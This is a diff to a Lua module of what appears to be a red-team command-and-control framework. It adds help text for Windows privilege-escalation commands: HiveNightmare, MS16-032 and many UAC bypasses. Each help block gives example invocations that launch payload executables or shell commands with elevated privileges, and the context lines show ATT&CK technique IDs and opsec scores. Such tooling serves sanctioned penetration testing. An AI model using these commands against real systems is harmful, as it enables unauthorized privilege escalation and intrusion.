@@ -300,6 +300,18 @@ local cmd_HiveNightmare = command("elevate:HiveNightmare", run_HiveNightmare,
         "HiveNightmare privilege escalation", "T1068")
 opsec("elevate:HiveNightmare", 9.0)
 
+help("elevate:HiveNightmare", [[
+HiveNightmare (CVE-2021-36934) privilege escalation using native EXE.
+
+**Usage:**
+
+```
+elevate HiveNightmare
+```
+
+> No arguments required. Exploits Volume Shadow Copy to access SAM/SYSTEM hives.
+]])
+
 -- =============================================================================
 -- CVE EXPLOITS (ELEVATEKIT)
 -- =============================================================================
@@ -439,6 +451,19 @@ local cmd_ms16_032 = command("elevate:ms16-032", run_ms16_032,
         "MS16-032 PowerShell privilege escalation", "T1068")
 opsec("elevate:ms16-032", 8.0)
 
+help("elevate:ms16-032", [[
+MS16-032 (CVE-2016-0032) privilege escalation via PowerShell secondary logon handle exploit.
+
+**Usage:**
+
+```
+elevate ms16-032
+elevate ms16-032 -Command "cmd.exe /c whoami"
+```
+
+> Uses PowerShell Invoke-MS16032 script. Affected Systems: Windows 7/8.1/10 (pre-patch), Server 2008/2012.
+]])
+
 -- cve-2020-0796 (SMBGhost)
 local function run_cve_2020_0796(args, cmd)
     local session = active()
@@ -546,6 +571,25 @@ local cmd_CmstpElevatedCOM = command("uac-bypass:elevatedcom", run_CmstpElevated
         "UAC bypass using CmstpElevatedCOM technique", "T1548.002")
 opsec("uac-bypass:elevatedcom", 8.5)
 
+help("uac-bypass:elevatedcom", [[
+UAC bypass using CmstpElevatedCOM technique via BOF.
+
+**Usage (positional argument required):**
+
+```
+uac-bypass elevatedcom <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass elevatedcom "C:\Windows\Temp\payload.exe"
+uac-bypass elevatedcom "cmd.exe /c whoami"
+```
+
+> x64 only. Uses CMSTP COM object elevation. Argument is the full command line to execute with elevated privileges.
+]])
+
 -- ColorDataProxy UAC Bypass
 local function run_ColorDataProxy(args)
     if #args < 1 then error("Command argument required") end
@@ -565,6 +609,25 @@ end
 local cmd_ColorDataProxy = command("uac-bypass:colordataproxy", run_ColorDataProxy,
         "UAC bypass using ColorDataProxy technique", "T1548.002")
 opsec("uac-bypass:colordataproxy", 8.5)
+
+help("uac-bypass:colordataproxy", [[
+UAC bypass using ColorDataProxy COM object technique via BOF.
+
+**Usage (positional argument required):**
+
+```
+uac-bypass colordataproxy <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass colordataproxy "C:\Windows\Temp\payload.exe"
+uac-bypass colordataproxy "cmd.exe /c net user"
+```
+
+> x64 only. Uses ICMLuaUtil COM interface via ColorDataProxy. Argument is the full command line to execute with elevated privileges.
+]])
 
 -- EditionUpgradeManager UAC Bypass
 local function run_EditionUpgradeManager(cmd)
@@ -599,6 +662,26 @@ cmd_EditionUpgradeManager:Flags():String("command", "", "Command to execute with
 cmd_EditionUpgradeManager:Flags():Bool("use_disk_file", false, "Use on-disk file variant")
 opsec("uac-bypass:editionupgrade", 8.5)
 
+help("uac-bypass:editionupgrade", [[
+UAC bypass using EditionUpgradeManager COM object technique.
+
+**Usage (--command flag required):**
+
+```
+uac-bypass editionupgrade --command <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass editionupgrade --command "C:\Windows\Temp\payload.exe"
+uac-bypass editionupgrade --command "cmd.exe /c whoami"
+uac-bypass editionupgrade --command "C:\payload.exe" --use_disk_file
+```
+
+> x64 only. `--use_disk_file` uses on-disk file variant instead of in-memory.
+]])
+
 -- Registry Shell Command UAC Bypass
 local function run_RegistryShellCommand(args)
     if #args < 1 then error("Command argument required") end
@@ -618,6 +701,25 @@ end
 local cmd_RegistryShellCommand = command("uac-bypass:registryshell", run_RegistryShellCommand,
         "UAC bypass using Registry Shell Command technique", "T1548.002")
 opsec("uac-bypass:registryshell", 8.5)
+
+help("uac-bypass:registryshell", [[
+UAC bypass using Registry Shell Command hijack technique via BOF.
+
+**Usage (positional argument required):**
+
+```
+uac-bypass registryshell <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass registryshell "C:\Windows\Temp\payload.exe"
+uac-bypass registryshell "cmd.exe /c whoami"
+```
+
+> x64 only. Hijacks shell command registry keys. Argument is the full command line to execute with elevated privileges.
+]])
 
 -- SilentCleanupWinDir UAC Bypass
 local function run_SilentCleanupWinDir(cmd)
@@ -652,6 +754,26 @@ cmd_SilentCleanupWinDir:Flags():String("command", "", "Command to execute with e
 cmd_SilentCleanupWinDir:Flags():Bool("use_disk_file", false, "Use on-disk file variant")
 opsec("uac-bypass:silentcleanup", 8.5)
 
+help("uac-bypass:silentcleanup", [[
+UAC bypass using SilentCleanup scheduled task with environment variable manipulation.
+
+**Usage (--command flag required):**
+
+```
+uac-bypass silentcleanup --command <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass silentcleanup --command "C:\Windows\Temp\payload.exe"
+uac-bypass silentcleanup --command "cmd.exe /c whoami"
+uac-bypass silentcleanup --command "C:\payload.exe" --use_disk_file
+```
+
+> x64 only. `--use_disk_file` uses on-disk file variant instead of in-memory.
+]])
+
 -- SspiUacBypass
 local function run_SspiUacBypass(args)
     if #args < 1 then error("Command argument required") end
@@ -671,6 +793,25 @@ end
 local cmd_SspiUacBypass = command("uac-bypass:sspi", run_SspiUacBypass,
         "UAC bypass using SSPI technique", "T1548.002")
 opsec("uac-bypass:sspi", 8.5)
+
+help("uac-bypass:sspi", [[
+UAC bypass using SSPI datagram context technique via BOF.
+
+**Usage (positional argument required):**
+
+```
+uac-bypass sspi <command_to_execute>
+```
+
+**Examples:**
+
+```
+uac-bypass sspi "C:\Windows\Temp\payload.exe"
+uac-bypass sspi "cmd.exe /c whoami"
+```
+
+> x64 only. Uses SSPI datagram context for elevation. Argument is the full command line to execute with elevated privileges.
+]])
 
 -- =============================================================================
 -- POWERSHELL UAC BYPASSES
@@ -692,6 +833,26 @@ local cmd_EnvBypass = command("uac-bypass:envbypass", run_EnvBypass,
         "UAC bypass using environment variable manipulation", "T1548.002")
 opsec("uac-bypass:envbypass", 8.0)
 
+help("uac-bypass:envbypass", [[
+UAC bypass using environment variable manipulation via PowerShell.
+
+**Usage:**
+
+```
+uac-bypass envbypass
+uac-bypass envbypass <powershell_arguments>
+```
+
+**Examples:**
+
+```
+uac-bypass envbypass
+uac-bypass envbypass "-Command whoami"
+```
+
+> Uses Invoke-EnvBypass.ps1 PowerShell script. Optional arguments are appended to the script invocation.
+]])
+
 -- EventVwr UAC bypass
 local function run_EventVwrBypass(args)
     local session = active()
@@ -709,6 +870,26 @@ local cmd_EventVwrBypass = command("uac-bypass:eventvwr", run_EventVwrBypass,
         "UAC bypass using Event Viewer hijack", "T1548.002")
 opsec("uac-bypass:eventvwr", 8.0)
 
+help("uac-bypass:eventvwr", [[
+UAC bypass using Event Viewer (eventvwr.msc) registry hijack via PowerShell.
+
+**Usage:**
+
+```
+uac-bypass eventvwr
+uac-bypass eventvwr <powershell_arguments>
+```
+
+**Examples:**
+
+```
+uac-bypass eventvwr
+uac-bypass eventvwr "-Command C:\payload.exe"
+```
+
+> Uses Invoke-EventVwrBypass.ps1. Hijacks HKCU registry to redirect eventvwr.msc handler. Optional arguments are appended to the script invocation.
+]])
+
 -- WScript UAC bypass
 local function run_WScriptBypass(args)
     local session = active()
@@ -725,5 +906,25 @@ end
 local cmd_WScriptBypass = command("uac-bypass:wscript", run_WScriptBypass,
         "UAC bypass using WScript hijack", "T1548.002")
 opsec("uac-bypass:wscript", 8.0)
+
+help("uac-bypass:wscript", [[
+UAC bypass using WScript.exe DLL hijack via PowerShell.
+
+**Usage:**
+
+```
+uac-bypass wscript
+uac-bypass wscript <powershell_arguments>
+```
+
+**Examples:**
+
+```
+uac-bypass wscript
+uac-bypass wscript "-Command C:\payload.exe"
+```
+
+> Uses Invoke-WScriptBypassUAC.ps1. Optional arguments are appended to the script invocation.
+]])
 
 
